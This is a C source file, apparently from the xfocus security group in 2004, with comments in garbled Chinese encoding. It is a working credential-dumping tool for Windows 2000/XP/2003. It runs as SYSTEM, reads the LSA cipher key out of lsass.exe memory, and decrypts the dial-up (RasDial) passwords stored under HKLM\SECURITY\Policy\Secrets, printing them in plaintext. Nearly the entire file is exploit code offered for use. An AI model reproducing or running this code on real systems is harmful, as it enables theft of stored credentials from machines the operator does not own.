/*
��ʾ��ԭNTƽ̨������������

ԭ����ֱ�Ӵ�ע����ж�ȡ���ܺ�����ݣ�����֮��

��������windows 2000/xp/2003ƽ̨��������Ȩ�޶�ȡע��� "HKLM\SECURITY"��

eyas at xfocus.org
http://www.xfocus.net
2004-10-01
*/
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include "wsu.cpp"
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "psapi.lib")

//��Ϯtombkeeper�Ĵ���:)
#define FCHK(a)     if (!(a)) {printf(#a " failed %d\n", GetLastError()); return 0;}

typedef struct _LSA_BLOB {
    DWORD cbData;
    DWORD cbMaxData;
    BYTE* pbData;
} LSA_BLOB;


typedef int (WINAPI *PSystemFunction005)(
    LSA_BLOB* pDataIn,
    LSA_BLOB* pDataKey,
    LSA_BLOB* pDataOut
);

PSystemFunction005    SystemFunction005;
DWORD                dwFlag=0;


//����lsadump2�е�dumplsa.c
int myisprint (int ch)
{
    return ((ch >= ' ') && (ch <= '~'));
}
//����lsadump2�е�dumplsa.c
void
dump_bytes (unsigned char *p, size_t sz)
{
    char szDumpBuff[256];

    if(sz==0)
        return;

    while (sz > 16) {
        _snprintf (szDumpBuff, sizeof (szDumpBuff),
                   " %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
                   p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7],
                   p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15],
                   myisprint(p[0]) ? p[0] : '.',
                   myisprint(p[1]) ? p[1] : '.',
                   myisprint(p[2]) ? p[2] : '.',
                   myisprint(p[3]) ? p[3] : '.',
                   myisprint(p[4]) ? p[4] : '.',
                   myisprint(p[5]) ? p[5] : '.',
                   myisprint(p[6]) ? p[6] : '.',
                   myisprint(p[7]) ? p[7] : '.',
                   myisprint(p[8]) ? p[8] : '.',
                   myisprint(p[9]) ? p[9] : '.',
                   myisprint(p[10]) ? p[10] : '.',
                   myisprint(p[11]) ? p[11] : '.',
                   myisprint(p[12]) ? p[12] : '.',
                   myisprint(p[13]) ? p[13] : '.',
                   myisprint(p[14]) ? p[14] : '.',
                   myisprint(p[15]) ? p[15] : '.');
        printf ("%s", szDumpBuff);
        p+=16;
        sz -= 16;
    }

    if (sz) {
        char buf[17];
        int i = 0;
        int j = 16 - sz;
        memset (buf, 0, sizeof (buf));
        szDumpBuff[0] = 0;
        while (sz--) {
            _snprintf (szDumpBuff+strlen (szDumpBuff),
                       sizeof (szDumpBuff) - strlen (szDumpBuff),
                       " %02X", *p);
            if (myisprint (*p))
                buf[i++] = *p;
            else
                buf[i++] = '.';
            p++;
        }
        _snprintf (szDumpBuff+strlen (szDumpBuff),
                   sizeof (szDumpBuff)-strlen (szDumpBuff),
                   "%*s%s\n", j*3 + 2, "", buf);
        printf ("%s", szDumpBuff);
    }
}

DWORD search_LsapDbSecretCipherKey(BYTE **ppKey, DWORD pid)
{
    HANDLE    hLsass, hLsasrv;
    DWORD    dwRead, i, dwAddr;
    BYTE    *pImage = NULL;
    MODULEINFO    mod;
    BOOL    bRet = FALSE;
    DWORD    dwCount = 0, dwMaxCount=100;

    FCHK ( (hLsasrv = LoadLibrary("lsasrv.dll")) );

    FCHK ( GetModuleInformation(GetCurrentProcess(), (HMODULE)hLsasrv, 
        &mod, sizeof(mod)) );

    FCHK ( hLsass = OpenProcess(PROCESS_VM_READ, FALSE, pid) );

    pImage = (BYTE*)malloc(mod.SizeOfImage);

    ReadProcessMemory(hLsass, (BYTE*)hLsasrv, 
                            pImage, mod.SizeOfImage-0x10, &dwRead);

    *ppKey = (BYTE*)malloc(dwMaxCount*0x10);
    
    __try
    {
        for(i=0;i<mod.SizeOfImage;i++)
        {
            if( memcmp(&pImage[i], "\x10\x00\x00\x00\x10\x00\x00\x00", 8) == 0)
            {
                dwAddr = *(DWORD *)(&pImage[i+8]);
                if( ReadProcessMemory(hLsass, (LPCVOID)dwAddr, 
                            &(*ppKey[dwCount*0x10]), 0x10, &dwRead) )
                {
                        dwCount++;
                }
            }
        }//end of for
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        return dwCount;
    }

    return dwCount;
}

int main(int argc, char **argv)
{
    int ret,i,j;
    HMODULE hAdvApi32;
    HKEY hKeySecrets;
    HKEY hKey;
    DWORD dwType;
    char Data[0x500] = {0};
    BYTE    *pKey;
    DWORD dwSize;
    LSA_BLOB LSADataIn;
    LSA_BLOB LSADataOut;
    LSA_BLOB LSADataKey;
    char szSecret[500];
    char szSubKey[0x500];
    DWORD dwErr, dwCount=0;

	CreateSystemProcess(0, NULL, 1);//Impersonate SYSTEM

    FCHK ((hAdvApi32 = LoadLibrary("advapi32.dll")));
    FCHK ((SystemFunction005 = (PSystemFunction005)
           GetProcAddress (hAdvApi32, "SystemFunction005")) != NULL);
    
    FCHK ((RegOpenKeyEx (HKEY_LOCAL_MACHINE,
                      "SECURITY\\Policy\\Secrets",
                      0, KEY_READ, &hKeySecrets) == ERROR_SUCCESS))

    FCHK ( ( dwCount = search_LsapDbSecretCipherKey(&pKey, GetProcessId("Lsass.exe")) ) != 0 );
    printf("Search \"LsapDbSecretCipherKey\" return: %d\n", dwCount);

    for(j=0;j<dwCount;j++)
    {
        printf("LsapDbSecretCipherKey [%d]\n", j);
        dump_bytes(&pKey[j*0x10], 0x10);

        LSADataKey.cbData = LSADataKey.cbMaxData = 0x10;
        LSADataKey.pbData = &pKey[j*0x10];

        //search our target
        for (i=0; TRUE; i++)
        {
            dwErr = RegEnumKeyA (hKeySecrets, i, szSecret, sizeof (szSecret));
            if (dwErr != ERROR_SUCCESS)
                //
                // No More Secrets
                //
                break;

			if(strnicmp(szSecret, "RasDial", 7) && strnicmp(szSecret, "L$_RasD", 7))
				continue;
            printf("\n%s\n", szSecret);
            //open it
            _snprintf(szSubKey, sizeof(szSubKey), 
                "SECURITY\\Policy\\Secrets\\%s\\CurrVal", szSecret);
            if (ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                                    szSubKey,
                                    0,
                                    KEY_READ,
                                    &hKey
                                    ) != ERROR_SUCCESS )
                continue;

            dwSize = sizeof(Data);
            FCHK ((ret = RegQueryValueEx(hKey,
                                "",
                                NULL,
                                &dwType,
                                (LPBYTE)Data,
                                &dwSize) == ERROR_SUCCESS ))

            LSADataIn.pbData = (BYTE *)Data + 0xC;  //���Ĵӵ�0xCλ��ʼ
            LSADataIn.cbData = dwSize-0xC;
            LSADataIn.cbMaxData = LSADataIn.cbData;

            //dump_bytes(LSADataIn.pbData, LSADataIn.cbData);

            LSADataOut.cbData = 0;
            LSADataOut.cbMaxData = 0;
            LSADataOut.pbData = NULL;

            SystemFunction005(&LSADataIn, &LSADataKey, &LSADataOut);
            if (LSADataOut.cbData == 0)
            {
                printf("null\n");
                continue;
            }

            FCHK ((LSADataOut.pbData = (BYTE*)malloc(LSADataOut.cbData) ) != NULL);
            LSADataOut.cbMaxData = LSADataOut.cbData;
            SystemFunction005(&LSADataIn, &LSADataKey, &LSADataOut);

            dump_bytes(LSADataOut.pbData, LSADataOut.cbData);
            free(LSADataOut.pbData);
        }//end of for
        //printf("Press any key to use next \"LsapDbSecretCipherKey\", or Ctrl+C to exit.\n");
        //getchar();
    }

	RevertToSelf();//!!!
    if(pKey)
        free(pKey);
    return 0;
}